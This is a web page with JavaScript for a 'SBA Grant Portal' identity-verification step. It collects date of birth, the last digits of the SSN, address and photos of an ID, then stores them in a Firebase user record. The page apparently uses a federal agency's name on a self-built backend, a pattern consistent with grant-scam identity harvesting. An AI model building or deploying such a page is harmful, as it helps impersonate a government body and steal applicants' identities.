<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Identity Verification | SBA Grant Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="global.css">
    <style>
        #kycFormView, #kycStatusView { display: none; animation: fadeSlide 0.4s ease; }
    </style>
</head>
<body>

    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>

    <div class="app-layout">
        <aside class="app-sidebar" id="appSidebar"></aside>
        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>

        <main class="app-main">
            <div id="pageHeader"></div>
            <div class="app-main__content" style="max-width: 800px;">
                
                <!-- Status View -->
                <div id="kycStatusView" class="status-screen">
                    <div id="statusIcon" class="status-screen__icon"></div>
                    <h1 id="statusTitle" class="status-screen__title"></h1>
                    <p id="statusMsg" class="status-screen__message"></p>
                    <div id="statusActions"></div>
                </div>

                <!-- Form View -->
                <div id="kycFormView">
                    <div class="alert alert--warning mb-8">
                        <i class="fa-solid fa-shield-halved"></i>
                        <div>
                            <strong>Federal Identity Verification</strong>
                            <p style="font-size:0.8rem; margin-top:4px;">To prevent fraudulent claims, all primary applicants must provide a government-issued photo ID. Documents are encrypted at rest.</p>
                        </div>
                    </div>

                    <form id="kycForm">
                        <div class="card mb-8">
                            <h3 class="mb-6">Personal Details</h3>
                            <div class="form-group"><label class="form-label form-label--required">Full Legal Name</label><input type="text" id="k-name" class="form-input" readonly></div>
                            <div class="form-row">
                                <div class="form-group"><label class="form-label form-label--required">Date of Birth</label><input type="date" id="k-dob" class="form-input" required></div>
                                <div class="form-group"><label class="form-label form-label--required">SSN (Last 4 Digits)</label><input type="password" id="k-ssn" class="form-input" maxlength="4" pattern="[0-9]{4}" placeholder="XXXX" required></div>
                            </div>
                            <div class="form-row">
                                <div class="form-group"><label class="form-label form-label--required">Phone Number</label><input type="tel" id="k-phone" class="form-input" required></div>
                                <div class="form-group">
                                    <label class="form-label form-label--required">Gender</label>
                                    <select id="k-gender" class="form-select" required>
                                        <option value="Male">Male</option><option value="Female">Female</option><option value="Non-binary">Non-binary</option><option value="Other">Prefer not to say</option>
                                    </select>
                                </div>
                            </div>
                            <div class="form-group"><label class="form-label form-label--required">Residential Address</label><input type="text" id="k-addr" class="form-input" required></div>
                        </div>

                        <div class="card mb-12">
                            <h3 class="mb-6">Document Upload</h3>
                            <div class="form-group">
                                <label class="form-label form-label--required">Select ID Type</label>
                                <select id="k-type" class="form-select mb-6" required>
                                    <option value="Driver License">Driver's License</option>
                                    <option value="Passport">Passport</option>
                                    <option value="State ID">State ID Card</option>
                                    <option value="Military ID">Military ID</option>
                                </select>
                            </div>

                            <div class="form-row">
                                <div class="form-group">
                                    <label class="form-label form-label--required">Front of ID</label>
                                    <div class="upload-area" id="box-front">
                                        <i class="fa-solid fa-id-card upload-area__icon"></i>
                                        <p class="upload-area__label">Tap to upload front</p>
                                        <img id="pre-front" class="upload-area__preview">
                                        <input type="file" id="in-front" hidden accept="image/*">
                                    </div>
                                </div>
                                <div class="form-group" id="backGroup">
                                    <label class="form-label">Back of ID</label>
                                    <div class="upload-area" id="box-back">
                                        <i class="fa-solid fa-address-card upload-area__icon"></i>
                                        <p class="upload-area__label">Tap to upload back</p>
                                        <img id="pre-back" class="upload-area__preview">
                                        <input type="file" id="in-back" hidden accept="image/*">
                                    </div>
                                </div>
                            </div>

                            <div class="form-group mt-8">
                                <label class="flex gap-3" style="cursor:pointer;"><input type="checkbox" required style="width:20px; height:20px;"> <span style="font-size:0.85rem; font-weight:600;">I certify that the provided identification is genuine and belongs to me.</span></label>
                            </div>

                            <button type="submit" class="btn btn--primary btn--full btn--lg mt-6" id="submitBtn">Submit for Audit</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
    </div>

    <script type="module">
        import { db, updateUserData, serverTimestamp, compressToBase64, addLedgerEntry, notifyAdmins } from './firebase-config.js';
        import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading } from './app.js';

        requireAuth((user, userData) => {
            buildSidebar({ activeId: 'kyc', userData });
            buildDock({ activeId: 'home' });
            buildPageHeader({ title: 'Identity Audit', subtitle: 'Step 1: Federal KYC Verification', backUrl: 'dashboard.html' });
            initNotificationBadge(user.uid);

            const fView = document.getElementById('kycFormView');
            const sView = document.getElementById('kycStatusView');

            // Logic for visibility
            if(userData.kycStatus === 'IDLE') {
                fView.style.display = 'block';
                document.getElementById('k-name').value = userData.fullName;
            } else {
                sView.style.display = 'block';
                updateStatusUI(userData);
            }

            function updateStatusUI(data) {
                const icon = document.getElementById('statusIcon');
                const title = document.getElementById('statusTitle');
                const msg = document.getElementById('statusMsg');
                const acts = document.getElementById('statusActions');

                if(data.kycStatus === 'UNDER_REVIEW') {
                    icon.className = 'status-screen__icon status-screen__icon--info';
                    icon.innerHTML = '<i class="fa-solid fa-magnifying-glass fa-pulse"></i>';
                    title.textContent = 'Documents Under Audit';
                    msg.textContent = 'Our compliance officers are verifying your documents. This process usually takes 24–48 hours.';
                } else if(data.kycStatus === 'APPROVED') {
                    icon.className = 'status-screen__icon status-screen__icon--success';
                    icon.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
                    title.textContent = 'Identity Verified';
                    msg.textContent = 'Your identity documents have been approved. You are now eligible to submit your grant application.';
                    acts.innerHTML = '<a href="apply.html" class="btn btn--primary">Continue to Application</a>';
                } else if(data.kycStatus === 'REJECTED') {
                    icon.className = 'status-screen__icon status-screen__icon--error';
                    icon.innerHTML = '<i class="fa-solid fa-circle-xmark"></i>';
                    title.textContent = 'Verification Failed';
                    msg.textContent = data.kyc?.reviewNote || 'The documents provided were illegible or invalid.';
                    acts.innerHTML = '<button class="btn btn--outline" id="retryBtn">Resubmit ID</button>';
                    document.getElementById('retryBtn').onclick = () => updateUserData(user.uid, { kycStatus: 'IDLE' }).then(() => location.reload());
                }
            }

            // Image Handlers
            let frontB64 = '', backB64 = '';
            const bindUpload = (boxId, inId, preId, type) => {
                const box = document.getElementById(boxId);
                const input = document.getElementById(inId);
                box.onclick = () => input.click();
                input.onchange = async (e) => {
                    const file = e.target.files[0];
                    if(!file) return;
                    showToast('Compressing image...', 'info');
                    const b64 = await compressToBase64(file);
                    if(type === 'f') frontB64 = b64; else backB64 = b64;
                    document.getElementById(preId).src = b64;
                    document.getElementById(preId).style.display = 'block';
                    box.classList.add('has-file');
                };
            };
            bindUpload('box-front', 'in-front', 'pre-front', 'f');
            bindUpload('box-back', 'in-back', 'pre-back', 'b');

            document.getElementById('k-type').onchange = (e) => {
                const isPassport = e.target.value === 'Passport';
                document.getElementById('backGroup').style.opacity = isPassport ? '0.4' : '1';
                document.getElementById('backGroup').style.pointerEvents = isPassport ? 'none' : 'auto';
            };

            document.getElementById('kycForm').onsubmit = async (e) => {
                e.preventDefault();
                if(!frontB64) return showToast('Please upload ID front', 'warning');
                const btn = document.getElementById('submitBtn');
                setButtonLoading(btn, true, 'Transmitting to Audit...');

                const payload = {
                    fullName: userData.fullName, dob: document.getElementById('k-dob').value, ssn: document.getElementById('k-ssn').value,
                    phone: document.getElementById('k-phone').value, address: document.getElementById('k-addr').value,
                    gender: document.getElementById('k-gender').value, idType: document.getElementById('k-type').value,
                    idFrontBase64: frontB64, idBackBase64: backB64, submittedAt: serverTimestamp()
                };

                try {
                    await updateUserData(user.uid, { kyc: payload, kycStatus: 'UNDER_REVIEW' });
                    await addLedgerEntry(user.uid, { type:'kyc', amount: 0, description: 'Identity Documents Submitted', status: 'UNDER_REVIEW' });
                    await notifyAdmins({ title: 'KYC Submittal', message: `${userData.fullName} sent documents.`, type: 'action' });
                    location.reload();
                } catch(err) {
                    showToast(err.message, 'error');
                    setButtonLoading(btn, false);
                }
            };
        });
    </script>
</body>
</html>
